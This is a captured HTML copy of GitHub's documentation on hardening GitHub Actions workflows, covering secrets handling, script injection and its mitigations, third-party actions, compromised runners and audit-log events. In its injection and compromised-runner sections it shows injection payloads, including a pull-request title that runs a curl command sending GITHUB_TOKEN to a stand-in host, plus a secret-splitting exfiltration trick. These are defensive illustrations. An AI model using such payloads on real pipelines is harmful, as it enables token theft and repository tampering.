+           <path d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z"></path>
+          </svg> </button> 
+        </div> 
+       </div> 
+       <div class="lead-mktg">
+        <p>Good security practices for using GitHub Actions features.</p>
+       </div> 
+       <div class="product-callout border rounded-1 mb-4 p-3 color-border-success color-bg-success"> 
+        <p>GitHub Actions is available with GitHub Free, GitHub Pro, GitHub Free for organizations, GitHub Team, GitHub Enterprise Cloud, GitHub Enterprise Server, and GitHub AE. GitHub Actions is not available for private repositories owned by accounts using legacy per-repository plans. For more information, see "<a href="/en/articles/github-s-products">GitHub's products</a>."</p> 
+       </div> 
+      </div> 
+      <div class="article-grid-toc border-bottom border-xl-0 pb-4 mb-5 pb-xl-0 mb-xl-0"> 
+       <div class="article-grid-toc-content"> 
+        <h2 id="in-this-article" class="f5 mb-2"><a class="Link--primary" href="#in-this-article">In this article</a></h2> 
+        <ul class="list-style-none pl-0 f5 mb-0"> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#overview">Overview</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#using-secrets">Using secrets</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#using-codeowners-to-monitor-changes">Using <code>CODEOWNERS</code> to monitor changes</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#understanding-the-risk-of-script-injections">Understanding the risk of script injections</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#example-of-a-script-injection-attack">Example of a script injection attack</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#good-practices-for-mitigating-script-injection-attacks">Good practices for mitigating script injection attacks</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#using-an-action-instead-of-an-inline-script-recommended">Using an action instead of an inline script (recommended)</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#using-an-intermediate-environment-variable">Using an intermediate environment variable</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#using-codeql-to-analyze-your-code">Using CodeQL to analyze your code</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#restricting-permissions-for-tokens">Restricting permissions for tokens</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#using-third-party-actions">Using third-party actions</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#potential-impact-of-a-compromised-runner">Potential impact of a compromised runner</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#accessing-secrets">Accessing secrets</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#exfiltrating-data-from-a-runner">Exfiltrating data from a runner</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#stealing-the-jobs-github_token">Stealing the job's <code>GITHUB_TOKEN</code></a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#modifying-the-contents-of-a-repository">Modifying the contents of a repository</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#considering-cross-repository-access">Considering cross-repository access</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#hardening-for-self-hosted-runners">Hardening for self-hosted runners</a></li> 
+         <li class="ml-0  mb-2 lh-condensed"><a href="#auditing-github-actions-events">Auditing GitHub Actions events</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-environments">Events for environments</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-configuration-changes">Events for configuration changes</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-secret-management">Events for secret management</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-self-hosted-runners">Events for self-hosted runners</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-self-hosted-runner-groups">Events for self-hosted runner groups</a></li> 
+         <li class="ml-3  mb-2 lh-condensed"><a href="#events-for-workflow-activities">Events for workflow activities</a></li> 
+        </ul> 
+       </div> 
+      </div> 
+      <div id="article-contents" class="article-grid-body"> 
+       <h3 id="overview"><a href="#overview">Overview</a></h3> 
+       <p>This guide explains how to configure security hardening for certain GitHub Actions features. If the GitHub Actions concepts are unfamiliar, see "<a href="/en/actions/getting-started-with-github-actions/core-concepts-for-github-actions">Core concepts for GitHub Actions</a>."</p> 
+       <h3 id="using-secrets"><a href="#using-secrets">Using secrets</a></h3> 
+       <p>Sensitive values should never be stored as plaintext in workflow files, but rather as secrets. <a href="/en/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets">Secrets</a> can be configured at the organization, repository, or environment level, and allow you to store sensitive information in GitHub.</p> 
+       <p>Secrets use <a href="https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes">Libsodium sealed boxes</a>, so that they are encrypted before reaching GitHub. This occurs when the secret is submitted <a href="/en/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository">using the UI</a> or through the <a href="/en/rest/reference/actions#secrets">REST API</a>. This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within GitHub's infrastructure. Once the secret is uploaded, GitHub is then able to decrypt it so that it can be injected into the workflow runtime.</p> 
+       <p>To help prevent accidental disclosure, GitHub uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:</p> 
+       <ul> 
+        <li> <p><strong>Never use structured data as a secret</strong></p> 
+         <ul> 
+          <li>Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.</li> 
+         </ul> </li> 
+        <li> <p><strong>Register all secrets used within workflows</strong></p> 
+         <ul> 
+          <li>If a secret is used to generate another sensitive value within a workflow, that generated value should be formally <a href="https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret">registered as a secret</a>, so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.</li> 
+          <li>Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.</li> 
+         </ul> </li> 
+        <li> <p><strong>Audit how secrets are handled</strong></p> 
+         <ul> 
+          <li>Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.</li> 
+          <li>View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to <code>STDOUT</code> and <code>STDERR</code>, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs.</li> 
+         </ul> </li> 
+        <li> <p><strong>Use credentials that are minimally scoped</strong></p> 
+         <ul> 
+          <li>Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository. </li> 
+          <li>Actions can use the <code>GITHUB_TOKEN</code> by accessing it from the <code>github.token</code> context. For more information, see "<a href="/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context">Context and expression syntax for GitHub Actions</a>." You should therefore make sure that the <code>GITHUB_TOKEN</code> is granted the minimum required permissions. It's good security practice to set the default permission for the <code>GITHUB_TOKEN</code> to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see "<a href="/en/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token">Authentication in a workflow</a>." </li> 
+         </ul> </li> 
+        <li> <p><strong>Audit and rotate registered secrets</strong></p> 
+         <ul> 
+          <li>Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.</li> 
+          <li>Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.</li> 
+         </ul> </li> 
+        <li> <p><strong>Consider requiring review for access to secrets</strong></p> 
+         <ul> 
+          <li>You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see "<a href="/en/actions/reference/encrypted-secrets">Encrypted secrets</a>" and "<a href="/en/actions/reference/environments">Environments</a>."</li> 
+         </ul> </li> 
+       </ul> 
+       <h3 id="using-codeowners-to-monitor-changes"><a href="#using-codeowners-to-monitor-changes">Using <code>CODEOWNERS</code> to monitor changes</a></h3> 
+       <p>You can use the <code>CODEOWNERS</code> feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in <code>.github/workflows</code>, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.</p> 
+       <p>For more information, see "<a href="/en/github/creating-cloning-and-archiving-repositories/about-code-owners">About code owners</a>."</p> 
+       <h3 id="understanding-the-risk-of-script-injections"><a href="#understanding-the-risk-of-script-injections">Understanding the risk of script injections</a></h3> 
+       <p>When creating workflows, <a href="/en/actions/creating-actions/about-actions">custom actions</a>, and <a href="/en/actions/creating-actions/creating-a-composite-run-steps-action">composite run step</a> actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.</p> 
+       <p> Attackers can add their own malicious content to the <a href="/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context"><code>github</code> context</a>, which should be treated as potentially untrusted input. These contexts typically end with <code>body</code>, <code>default_branch</code>, <code>email</code>, <code>head_ref</code>, <code>label</code>, <code>message</code>, <code>name</code>, <code>page_name</code>,<code>ref</code>, and <code>title</code>. For example: <code>github.event.issue.title</code>, or <code>github.event.pull_request.body</code>. </p> 
+       <p> You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of GitHub Actions. For information on some of the steps an attacker could take, see <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner">"Potential impact of a compromised runner</a>."</p> 
+       <p>In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, <code>zzz";echo${IFS}"hello";#</code> would be a valid branch name and would be a possible attack vector for a target repository.</p> 
+       <p>The following sections explain how you can help mitigate the risk of script injection.</p> 
+       <h4 id="example-of-a-script-injection-attack"><a href="#example-of-a-script-injection-attack">Example of a script injection attack</a></h4> 
+       <p>A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:</p> 
+       <pre><code>      - name: Check PR title
+        run: |
+          title="${{ github.event.pull_request.title }}"
+          if [[ $title =~ ^octocat ]]; then
+          echo "PR title starts with 'octocat'"
+          exit 0
+          else
+          echo "PR title did not start with 'octocat'"
+          exit 1
+          fi
+</code></pre> 
+       <p>This example is vulnerable to script injection because the <code>run</code> command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside <code>${{ }}</code> are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection. </p> 
+       <p>To inject commands into this workflow, the attacker could create a pull request with a title of <code>a"; ls $GITHUB_WORKSPACE"</code>:</p> 
+       <p><img src="/assets/images/help/images/example-script-injection-pr-title.png" alt="Example of script injection in PR title"></p> 
+       <p>In this example, the <code>"</code> character is used to interrupt the <code>title="${{ github.event.pull_request.title }}"</code> statement, allowing the <code>ls</code> command to be executed on the runner. You can see the output of the <code>ls</code> command in the log:</p> 
+       <p><img src="/assets/images/help/images/example-script-injection-result.png" alt="Example result of script injection"></p> 
+       <h3 id="good-practices-for-mitigating-script-injection-attacks"><a href="#good-practices-for-mitigating-script-injection-attacks">Good practices for mitigating script injection attacks</a></h3> 
+       <p>There are a number of different approaches available to help you mitigate the risk of script injection:</p> 
+       <h4 id="using-an-action-instead-of-an-inline-script-recommended"><a href="#using-an-action-instead-of-an-inline-script-recommended">Using an action instead of an inline script (recommended)</a></h4> 
+       <p>The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:</p> 
+       <pre><code>uses: fakeaction/checktitle@v3
+with:
+    title: ${{ github.event.pull_request.title }}
+</code></pre> 
+       <h4 id="using-an-intermediate-environment-variable"><a href="#using-an-intermediate-environment-variable">Using an intermediate environment variable</a></h4> 
+       <p>For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.</p> 
+       <p>The following example uses Bash to process the <code>github.event.pull_request.title</code> value as an environment variable:</p> 
+       <pre><code>      - name: Check PR title
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          if [[ "$TITLE" =~ ^octocat ]]; then
+          echo "PR title starts with 'octocat'"
+          exit 0
+          else
+          echo "PR title did not start with 'octocat'"
+          exit 1
+          fi
+</code></pre> 
+       <p>In this example, the attempted script injection is unsuccessful:</p> 
+       <p><img src="/assets/images/help/images/example-script-injection-mitigated.png" alt="Example of mitigated script injection"></p> 
+       <p>With this approach, the value of the <code>${{ github.event.issue.title }}</code> expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid <a href="https://github.com/koalaman/shellcheck/wiki/SC2086">word splitting</a>, but this is <a href="https://mywiki.wooledge.org/BashPitfalls">one of many</a> general recommendations for writing shell scripts, and is not specific to GitHub Actions.</p> 
+       <h4 id="using-codeql-to-analyze-your-code"><a href="#using-codeql-to-analyze-your-code">Using CodeQL to analyze your code</a></h4> 
+       <p>To help you manage the risk of dangerous patterns as early as possible in the development lifecycle, the GitHub Security Lab has developed <a href="https://github.com/github/codeql/tree/main/javascript/ql/src/experimental/Security/CWE-094">CodeQL queries</a> that repository owners can <a href="/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#running-additional-queries">integrate</a> into their CI/CD pipelines. For more information, see "<a href="/en/github/finding-security-vulnerabilities-and-errors-in-your-code/about-code-scanning">About code scanning</a>."</p> 
+       <p>The scripts currently depend on the CodeQL JavaScript libraries, which means that the analyzed repository must contain at least one JavaScript file and that CodeQL must be <a href="/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed">configured to analyze this language</a>.</p> 
+       <ul> 
+        <li><code>ExpressionInjection.ql</code>: Covers the expression injections described in this article, and is considered to be reasonably accurate. However, it doesn’t perform data flow tracking between workflow steps.</li> 
+        <li><code>UntrustedCheckout.ql</code>: This script's results require manual review to determine whether the code from a pull request is actually treated in an unsafe manner. For more information, see "<a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests">Keeping your GitHub Actions and workflows secure: Preventing pwn requests</a>" on the GitHub Security Lab blog.</li> 
+       </ul> 
+       <h4 id="restricting-permissions-for-tokens"><a href="#restricting-permissions-for-tokens">Restricting permissions for tokens</a></h4> 
+       <p>To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "<a href="/en/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token">Modifying the permissions for the GITHUB_TOKEN</a>."</p> 
+       <h3 id="using-third-party-actions"><a href="#using-third-party-actions">Using third-party actions</a></h3> 
+       <p>The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.</p> 
+       <p>This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the <code>GITHUB_TOKEN</code> to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on GitHub. For information on some of the steps an attacker could take, see <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner">"Potential impact of a compromised runner</a>."</p> 
+       <p>You can help mitigate this risk by following these good practices:</p> 
+       <ul> 
+        <li> <p><strong>Pin actions to a full length commit SHA</strong></p> <p>Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload.</p> </li> 
+       </ul> 
+       <ul> 
+        <li> <p><strong>Audit the source code of the action</strong></p> <p>Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.</p> </li> 
+        <li> <p><strong>Pin actions to a tag only if you trust the creator</strong></p> <p>Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on GitHub Marketplace is a useful signal, as it indicates that the action was written by a team whose identity has been verified by GitHub. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.</p> </li> 
+       </ul> 
+       <h3 id="potential-impact-of-a-compromised-runner"><a href="#potential-impact-of-a-compromised-runner">Potential impact of a compromised runner</a></h3> 
+       <p>These sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner. </p> 
+       <h4 id="accessing-secrets"><a href="#accessing-secrets">Accessing secrets</a></h4> 
+       <p>Workflows triggered using the <code>pull_request</code> event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as <code>issue_comment</code>, <code>issues</code> and <code>push</code>, where the attacker could attempt to steal repository secrets or use the write permission of the job's <a href="/en/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token"><code>GITHUB_TOKEN</code></a>. </p> 
+       <ul> 
+        <li> <p>If the secret or token is set to an environment variable, it can be directly accessed through the environment using <code>printenv</code>.</p> </li> 
+        <li> <p>If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.</p> </li> 
+        <li> <p>For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:</p> <pre><code>uses: fakeaction/publish@v3
+with:
+    key: ${{ secrets.PUBLISH_KEY }}
+</code></pre> </li> 
+       </ul> 
+       <p>Although GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the <code>GITHUB_TOKEN</code> and any referenced secrets can be harvested by a determined attacker.</p> 
+       <h4 id="exfiltrating-data-from-a-runner"><a href="#exfiltrating-data-from-a-runner">Exfiltrating data from a runner</a></h4> 
+       <p>An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions <a href="/en/actions/reference/encrypted-secrets#accessing-your-secrets">automatically redact secrets printed to the log</a>, but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using <code>echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};</code>. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.</p> 
+       <h4 id="stealing-the-jobs-github_token"><a href="#stealing-the-jobs-github_token">Stealing the job's <code>GITHUB_TOKEN</code></a></h4> 
+       <p>It is possible for an attacker to steal a job's <code>GITHUB_TOKEN</code>. The GitHub Actions runner automatically receives a generated <code>GITHUB_TOKEN</code> with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: <code>a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#</code>.</p> 
+       <h4 id="modifying-the-contents-of-a-repository"><a href="#modifying-the-contents-of-a-repository">Modifying the contents of a repository</a></h4> 
+       <p>The attacker server can use the GitHub API to <a href="/en/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token">modify repository content</a>, including releases, if the assigned permissions of <code>GITHUB_TOKEN</code> <a href="/en/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token">are not restricted</a>.</p> 
+       <h3 id="considering-cross-repository-access"><a href="#considering-cross-repository-access">Considering cross-repository access</a></h3> 
+       <p>GitHub Actions is intentionally scoped for a single repository at a time. The <code>GITHUB_TOKEN</code> grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the <code>GITHUB_TOKEN</code> if necessary. Users have specific permissions for each repository, so allowing the <code>GITHUB_TOKEN</code> for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.</p> 
+       <p>We have <a href="https://github.com/github/roadmap/issues/74">a plan on the GitHub roadmap</a> to support a flow that allows cross-repository access within GitHub, but this is not yet a supported feature. Currently, the only way to perform privileged cross-repository interactions is to place a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.</p> 
+       <p>This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:</p> 
+       <ol> 
+        <li><strong>The <code>GITHUB_TOKEN</code></strong>
+         <ul> 
+          <li>This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see "<a href="/en/actions/configuring-and-managing-workflows/authenticating-with-the-github_token">Authenticating with the GITHUB_TOKEN</a>."</li> 
+          <li>The <code>GITHUB_TOKEN</code> should be used whenever possible.</li> 
+         </ul></li> 
+        <li><strong>Repository deploy key</strong>
+         <ul> 
+          <li>Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see "<a href="/en/developers/overview/managing-deploy-keys#deploy-keys">Managing deploy keys</a>."</li> 
+          <li>Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.</li> 
+         </ul></li> 
+        <li><strong>GitHub App tokens</strong>
+         <ul> 
+          <li>GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories.</li> 
+         </ul></li> 
+        <li><strong>Personal access tokens</strong>
+         <ul> 
+          <li>You should never use personal access tokens from your own account. These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your user account. This indirectly grants broad access to all write-access users of the repository the workflow is in. In addition, if you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging.</li> 
+          <li>If a personal access token is used, it should be one that was generated for a new account that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.</li> 
+         </ul></li> 
+        <li><strong>SSH keys on a user account</strong>
+         <ul> 
+          <li>Workflows should never use the SSH keys on a user account. Similar to personal access tokens, they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.</li> 
+         </ul></li> 
+       </ol> 
+       <h3 id="hardening-for-self-hosted-runners"><a href="#hardening-for-self-hosted-runners">Hardening for self-hosted runners</a></h3> 
+       <p><strong>GitHub-hosted</strong> runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.</p> 
+       <p><strong>Self-hosted</strong> runners on GitHub do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.</p> 
+       <p>As a result, self-hosted runners should almost <a href="/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories">never be used for public repositories</a> on GitHub, because any user can open pull requests against the repository and compromise the environment. Similarly, be cautious when using self-hosted runners on private repositories, as anyone who can fork the repository and open a pull request (generally those with read-access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the <code>GITHUB_TOKEN</code> which, depending on its settings, can grant write-access permissions on the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.</p> 
+       <p>When a self-hosted runner is defined at the organization or enterprise level, GitHub can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups">Managing access to self-hosted runners using groups</a>."</p> 
+       <p>You should also consider the environment of the self-hosted runner machines:</p> 
+       <ul> 
+        <li>What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.</li> 
+        <li>Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.</li> 
+       </ul> 
+       <p>Some customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job.</p> 
+       <h3 id="auditing-github-actions-events"><a href="#auditing-github-actions-events">Auditing GitHub Actions events</a></h3> 
+       <p>You can use the audit log to monitor administrative tasks in an organization. The audit log records the type of action, when it was run, and which user account performed the action.</p> 
+       <p>For example, you can use the audit log to track the <code>org.update_actions_secret</code> event, which tracks changes to organization secrets: <img src="/assets/images/help/repository/audit-log-entries.png" alt="Audit log entries"></p> 
+       <p>The following tables describe the GitHub Actions events that you can find in the audit log. For more information on using the audit log, see "<a href="/en/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log">Reviewing the audit log for your organization</a>."</p> 
+       <h4 id="events-for-environments"><a href="#events-for-environments">Events for environments</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>environment.create_actions_secret</code></td>
+          <td>Triggered when a secret is created in an environment. For more information, see <a href="/en/actions/reference/environments#environment-secrets">"Environment secrets</a>."</td>
+         </tr>
+         <tr>
+          <td><code>environment.delete</code></td>
+          <td>Triggered when an environment is deleted. For more information, see <a href="/en/actions/reference/environments#deleting-an-environment">"Deleting an environment</a>."</td>
+         </tr>
+         <tr>
+          <td><code>environment.remove_actions_secret</code></td>
+          <td>Triggered when a secret is removed from an environment. For more information, see <a href="/en/actions/reference/environments#environment-secrets">"Environment secrets</a>."</td>
+         </tr>
+         <tr>
+          <td><code>environment.update_actions_secret</code></td>
+          <td>Triggered when a secret in an environment is updated. For more information, see <a href="/en/actions/reference/environments#environment-secrets">"Environment secrets</a>."</td>
+         </tr>
+        </tbody>
+       </table> 
+       <h4 id="events-for-configuration-changes"><a href="#events-for-configuration-changes">Events for configuration changes</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>repo.actions_enabled</code></td>
+          <td>Triggered when GitHub Actions is enabled for a repository. Can be viewed using the UI. This event is not visible when you access the audit log using the REST API. For more information, see "<a href="#using-the-rest-api">Using the REST API</a>."</td>
+         </tr>
+        </tbody>
+       </table> 
+       <h4 id="events-for-secret-management"><a href="#events-for-secret-management">Events for secret management</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>org.create_actions_secret</code></td>
+          <td>Triggered when a GitHub Actions secret is created for an organization. For more information, see "<a href="/en/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization">Creating encrypted secrets for an organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.remove_actions_secret</code></td>
+          <td>Triggered when a GitHub Actions secret is removed.</td>
+         </tr>
+         <tr>
+          <td><code>org.update_actions_secret</code></td>
+          <td>Triggered when a GitHub Actions secret is updated.</td>
+         </tr>
+         <tr>
+          <td><code>repo.create_actions_secret </code></td>
+          <td>Triggered when a GitHub Actions secret is created for a repository. For more information, see "<a href="/en/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository">Creating encrypted secrets for a repository</a>."</td>
+         </tr>
+         <tr>
+          <td><code>repo.remove_actions_secret</code></td>
+          <td>Triggered when a GitHub Actions secret is removed.</td>
+         </tr>
+         <tr>
+          <td><code>repo.update_actions_secret</code></td>
+          <td>Triggered when a GitHub Actions secret is updated.</td>
+         </tr>
+        </tbody>
+       </table> 
+       <h4 id="events-for-self-hosted-runners"><a href="#events-for-self-hosted-runners">Events for self-hosted runners</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>enterprise.register_self_hosted_runner</code></td>
+          <td>Triggered when a new self-hosted runner is registered. For more information, see "<a href="/en/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise">Adding a self-hosted runner to an enterprise</a>."</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.remove_self_hosted_runner</code></td>
+          <td>Triggered when a self-hosted runner is removed.</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.runner_group_runners_updated</code></td>
+          <td>Triggered when a runner group's list of members is updated. For more information, see "<a href="/en/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization">Set self-hosted runners in a group for an organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.self_hosted_runner_updated</code></td>
